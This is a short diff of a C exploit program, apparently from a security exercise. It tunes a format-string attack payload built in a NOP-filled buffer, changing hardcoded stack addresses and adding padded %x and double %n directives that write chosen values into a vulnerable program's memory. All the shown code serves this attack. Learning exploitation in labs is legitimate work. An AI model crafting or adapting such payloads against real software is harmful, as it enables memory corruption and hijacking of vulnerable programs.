@@ -11,11 +11,11 @@ int main(void)
   int i;
   char *args[3];
   char *env[1];
-  char buf[18];
-  memset(buf, 0x90, 18);
+  char buf[50];
+  memset(buf, 0x90, 50);
 
-  strncpy(buf, "\x40\xfb\xff\xbf%08x%08x%08x%n", 18); 
-
+  //strncpy(buf, "\x50\xfb\xff\xbf%08x%08x%08x%n", 18); 
+  strncpy(buf, "\x50\xfb\xff\xbf\x51\xfb\xff\xbf%08x%08x%76x%n%n", 24);
   //for(i = 0; i < 113; i++) {
     //strncpy(buf+4+(i*4), "%08x", 4); 
   //}
